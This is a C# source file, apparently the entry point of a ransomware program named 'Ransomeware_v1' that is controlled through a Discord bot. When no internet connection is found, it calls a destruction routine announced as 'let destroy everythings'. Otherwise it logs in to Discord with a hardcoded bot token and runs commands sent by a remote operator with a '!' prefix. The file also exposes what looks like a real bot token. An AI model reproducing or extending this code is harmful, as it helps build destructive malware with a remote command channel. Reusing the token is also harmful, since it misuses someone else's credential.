using System;
using System.Reflection;
using System.Threading.Tasks;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.Net;


namespace Ransomeware_v1
{
    class Program
    {
        public static void Main(string[] args)
        => new Program().RunBotAsync().GetAwaiter().GetResult();

        
        private DiscordSocketClient _client;
        private CommandService _commands;
        private IServiceProvider _services;

        public async Task RunBotAsync()
        {

            if (IsConnectedToInternet())
            {
                Console.WriteLine("Internet oke");
            } else
            {
                Console.WriteLine("Internet down, let destroy everythings");
                Ransomeware_v1.Modules.Destruction.Start_Destroy();
                return;
            }                


            _client = new DiscordSocketClient();
            _commands = new CommandService();

            //_services = new ServiceCollection()
            //    .AddSingleton(_client)
            //    .AddSingleton(_commands)
            //    .BuildServiceProvider();

            string token = "ODUwNTg2MTUyMTEzMDEyNzQ3.YLr4FQ.O-aEEeO6fsHra7ukIoF3EuRWmyM";

            _client.Log += _client_Log;

            await RegisterCommandsAsync();

            await _client.LoginAsync(TokenType.Bot, token);

            await _client.StartAsync();

            await Task.Delay(-1);

        }

        private Task _client_Log(LogMessage arg)
        {
            Console.WriteLine(arg);
            return Task.CompletedTask;
        }

        public async Task RegisterCommandsAsync()
        {
            _client.MessageReceived += HandleCommandAsync;
            await _commands.AddModulesAsync(Assembly.GetEntryAssembly(), _services);
        }

        private async Task HandleCommandAsync(SocketMessage arg)
        {
            var message = arg as SocketUserMessage;
            var context = new SocketCommandContext(_client, message);
            if (message.Author.IsBot) return;

            int argPos = 0;
            if (message.HasStringPrefix("!", ref argPos))
            {
                var result = await _commands.ExecuteAsync(context, argPos, _services);
                if (!result.IsSuccess) Console.WriteLine(result.ErrorReason);
                if (result.Error.Equals(CommandError.UnmetPrecondition)) await message.Channel.SendMessageAsync(result.ErrorReason);
            }
        }
        public bool IsConnectedToInternet()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com"))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
    }
}
